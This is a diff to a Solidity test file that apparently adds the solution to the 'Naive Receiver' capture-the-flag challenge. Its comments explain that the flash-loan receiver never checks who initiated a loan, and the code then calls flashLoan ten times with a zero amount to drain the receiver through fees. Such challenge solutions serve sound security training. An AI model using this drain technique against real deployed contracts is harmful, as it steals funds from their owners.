@@ -50,6 +50,23 @@ contract NaiveReceiver is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // NOTE: Here the exploit is that the FlashLoanReceiver does not check who initiated
+        // the flash loan. So the attacker can call the flashLoan and pass the address of the FlashLoanReceiver
+        // with a borrow amount of 0 forcing the FlashLoanReceiver to send the fee (1 ether) per call
+
+        // NOTE: To do this in one tx you can wrap the 10 calls into a function and call it
+
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+
         /** EXPLOIT END **/
         validation();
     }
